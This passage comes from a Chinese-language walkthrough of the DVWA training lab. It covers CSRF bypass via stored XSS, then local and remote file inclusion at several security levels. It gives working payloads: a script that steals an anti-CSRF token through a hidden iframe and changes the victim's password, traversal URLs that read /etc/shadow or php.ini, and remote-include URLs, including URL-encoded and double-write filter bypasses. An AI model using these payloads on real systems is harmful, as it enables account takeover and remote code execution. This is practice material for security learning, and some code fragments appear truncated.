		$pass_new = md5( $pass_new );
		// Update the database
		$insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
		$result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '' );
		// Feedback for the user
		$html .= "Password Changed.";
	}
	else {
		// Issue with passwords matching
		$html .= "Passwords did not match.";
	}
	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}
// Generate Anti-CSRF token
generateSessionToken();
?>
```
可以看到,High 级别的代码加入了 Anti-CSRF token 机制,用户每次访问改密页面时,服务器会返回一个随机的 token,向服务器发起请求时,需要提交 token 参数,而服务器在收到请求时,会优先检查 token,只有 token 正确,才会处理客户端的请求.
**漏洞利用**
要绕过 High 级别的反 CSRF 机制,关键是要获取 token,要利用受害者的 cookie 去修改密码的页面获取关键的 token.
试着去构造一个攻击页面,将其放置在攻击者的服务器,引诱受害者访问,从而完成 CSRF 攻击,下面是代码.
```html
/dvwa/vulnerabilities/csrf" id="hack" border="0" style="display:none;">
/dvwa/vulnerabilities/csrf">
```
攻击思路是当受害者点击进入这个页面,脚本会通过一个看不见框架偷偷访问修改密码的页面,获取页面中的 token,并向服务器发送改密请求,以完成 CSRF 攻击.
然而理想与现实的差距是巨大的,这里牵扯到了跨域问题,而现在的浏览器是不允许跨域请求的.这里简单解释下跨域,我们的框架 iframe 访问的地址是 http:///dvwa/vulnerabilities/csrf ,位于服务器 A 上,而我们的攻击页面位于黑客服务器 B 上,两者的域名不同,域名 B 下的所有页面都不允许主动获取域名 A 下的页面内容,除非域名 A 下的页面主动发送信息给域名 B 的页面,所以我们的攻击脚本是不可能取到改密界面中的 user_token.
由于跨域是不能实现的,所以我们要将攻击代码注入到 dvwa 靶机中,才有可能完成攻击.下面利用 High 级别的存储型 XSS 漏洞协助获取 Anti-CSRF token(因为这里的 XSS 注入有长度限制,不能够注入完整的攻击脚本,所以只获取 Anti-CSRF token).
注入代码如下
``
**另类通关**
通过 XSS 获得 token 之后修改密码
同等级的 XSS-Stored $name 可被我们利用做 XSS,这样就可以配合 CSRF 来重置用户密码了.
需要先说明一下 DVWA 的数据库设计,guestbook 表的 name 字段类型为 varchar(100),也就是说最多 name 只能写入 100 个字符,超过的字符会被数据库抛弃不存储.
由于100个字符的限制,将payload分成多份提交
```js
  # 事件内可以解析ASCII编码后的字符串
  # 拼接出一个script来引入外部js
/x.js'">
```
这样就可以绕过后端的正则过滤
为了方便测试,在 x.js 里只写了 `alert('HelloDVWA')`
发现成功了!!!x.js 被成功加载了.但多次加载还是有问题
使用延时,人工干预执行时序
```js
/x.js'},5000)">
```
稳定触发
下面修改 x.js
```js
ifr = document.createElement('iframe');
ifr.src="../csrf";
ifr.hidden=1;
document.body.appendChild(ifr);
setTimeout(function(){f=frames[0];t=f.document.getElementsByName('user_token')[0].value;i=document.createElement('img');i.src='../csrf/?password_new=admin&password_conf=admin&Change=Change&user_token='+t;},3000)
```
当管理员访问留言板 XSS-Stored 时候:
1. 会先加载 `x.js`
2. `x.js` 内的脚本内容,会创建一个隐藏的 `iframe` 标签到 `DOM`
3. 等待 `iframe` 创建完成之后,便通过创建一个 `img` 标签,自动触发修改密码的请求
### Impossible
**服务器端核心代码**
```php
prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
	$data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
	$data->bindParam( ':password', $pass_curr, PDO::PARAM_STR );
	$data->execute();
	// Do both new passwords match and does the current password match the user?
	if( ( $pass_new == $pass_conf ) && ( $data->rowCount() == 1 ) ) {
		// It does!
		$pass_new = stripslashes( $pass_new );
		$pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
		$pass_new = md5( $pass_new );
		// Update database with new password
		$data = $db->prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );
		$data->bindParam( ':password', $pass_new, PDO::PARAM_STR );
		$data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
		$data->execute();
		// Feedback for the user
		$html .= "Password Changed.";
	}
	else {
		// Issue with passwords matching
		$html .= "Passwords did not match or current password incorrect.";
	}
}
// Generate Anti-CSRF token
generateSessionToken();
?>
```
可以看到,Impossible 级别的代码利用 PDO 技术防御 SQL 注入,至于防护 CSRF,则要求用户输入原始密码(简单粗暴),攻击者在不知道原始密码的情况下,无论如何都无法进行 CSRF 攻击.
---
## File_Inclusion
File Inclusion,意思是文件包含(漏洞),是指当服务器开启 allow_url_include 选项时,就可以通过 php 的某些特性函数(include(),require() 和 include_once(),require_once())利用 url 去动态包含文件,此时如果没有对文件来源进行严格审查,就会导致任意文件读取或者任意命令执行.文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞,远程文件包含漏洞是因为开启了 php 置中的 allow_url_fopen 选项(选项开启之后,服务器允许包含一个远程的文件).
phpstudy开一下这2个参数
### Low
**服务器端核心代码**
```php
```
可以看到,服务器端对 page 参数没有做任何的过滤跟检查.
服务器期望用户的操作是点击下面的三个链接,服务器会包含相应的文件,并将结果返回.需要特别说明的是,服务器包含文件时,不管文件后缀是否是 php,都会尝试当做 php 文件执行,如果文件内容确为 php,则会正常执行并返回结果,如果不是,则会原封不动地打印文件内容,所以文件包含漏洞常常会导致任意文件读取与任意命令执行.
点击 file1.php 后,显示如下
而现实中,恶意的攻击者是不会乖乖点击这些链接的,因此 page 参数是不可控的.
**本地文件包含**
构造 url`http:///dvwa/vulnerabilities/fi/page=/etc/shadow`
报错,显示没有这个文件,说明不是服务器系统不是 Linux,但同时暴露了服务器文件的绝对路径
- **构造url(绝对路径)**
    `http:///dvwa/vulnerabilities/fi/page=C:/phpStudy/PHPTutorial/WWW/DVWA/php.ini`
    成功读取了服务器的 php.ini 文件
    `http:///dvwa/vulnerabilities/fi/?page=file4.php`
- **构造url(相对路径)**
    `http:///dvwa/vulnerabilities/fi/page=../../../../../../../../../phpStudy/PHPTutorial/WWW/DVWA/php.ini`
    加这么多 ../ 是为了保证到达服务器的C盘根目录,可以看到读取是成功的.
    同时我们看到,配置文件中的 Magic_quote_gpc 选项为 off.在 php 版本小于 5.3.4 的服务器中,当 Magic_quote_gpc 选项为 off 时,我们可以在文件名中使用 %00 进行截断,也就是说文件名中 %00 后的内容不会被识别,即下面两个 url 是完全等效的.
    1. http:///dvwa/vulnerabilities/fi/?page=../../../../../../../../../phpStudy/PHPTutorial/WWW/DVWA/php.ini
    2. http:///dvwa/vulnerabilities/fi/?page=../../../../../../../../../phpStudy/PHPTutorial/WWW/DVWA/php.ini%0012.php
    使用 %00 截断可以绕过某些过滤规则,例如要求 page 参数的后缀必须为 php,这时链接 A 会读取失败,而链接 B 可以绕过规则成功读取.
**远程文件包含**
当服务器的 php 配置中,选项 allow_url_fopen 与 allow_url_include 为开启状态时,服务器会允许包含远程服务器上的文件,如果对文件来源没有检查的话,就容易导致任意远程代码执行.
在远程服务器 B 上传一个 phpinfo.txt 文件,内容如下
```php
```
构造url `http:///dvwa/vulnerabilities/fi/?page=http:///phpinfo.txt`
成功在服务器上执行了 phpinfo 函数
为了增加隐蔽性,可以对 http:///phpinfo.txt 进行 URL 编码
例如
`http://192.168.72.128/dvwa/vulnerabilities/fi/?page=http://192.168.72.138/phpinfo.txt`
可以编码为
`http://192.168.72.128/dvwa/vulnerabilities/fi/?page=%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%37%32%2e%31%33%38%2f%70%68%70%69%6e%66%6f%2e%74%78%74` 同样可以执行成功
### Medium
**服务器端核心代码**
```php
```
可以看到,Medium 级别的代码增加了 str_replace 函数,对 page 参数进行了一定的处理,将"http:// "、"https://"、 " ../"、"..\"替换为空字符,即删除.
**相关函数**
- **str_replace()**
	str_replace() 函数以其他字符替换字符串中的一些字符(区分大小写).
	该函数必须遵循下列规则:
	- 如果搜索的字符串是数组,那么它将返回数组.
	- 如果搜索的字符串是数组,那么它将对数组中的每个元素进行查找和替换.
	- 如果同时需要对数组进行查找和替换,并且需要执行替换的元素少于查找到的元素的数量,那么多余元素将用空字符串进行替换
	- 如果查找的是数组,而替换的是字符串,那么替代字符串将对所有查找到的值起作用.
**漏洞利用**
使用 str_replace 函数是极其不安全的,因为可以使用双写绕过替换规则.
例如 `page=hthttp://tp:///phpinfo.txt` 时,str_replace 函数会将 http:// 删除,于是 `page=http:///phpinfo.txt`,成功执行远程命令.
同时,因为替换的只是"../"、"..\",所以对采用绝对路径的方式包含文件是不会受到任何限制的.
**本地文件包含**
`http:///dvwa/vulnerabilities/fi/?page=..././..././..././..././..././..././..././..././..././phpStudy/PHPTutorial/WWW/DVWA/php.ini` 读取配置文件成功
**远程文件包含**
`http:///dvwa/vulnerabilities/fi/?page=hhttp://ttp:///phpinfo.txt` 远程执行命令成功
经过编码后的 url 不能绕过替换规则,因为解码是在浏览器端完成的,发送过去的 page 参数依然是http:///phpinfo.txt,因此读取失败.
### High
**服务器端核心代码**
```php
<?php
// The page we wish to display
$file = $_GET[ 'page' ];
// Input validation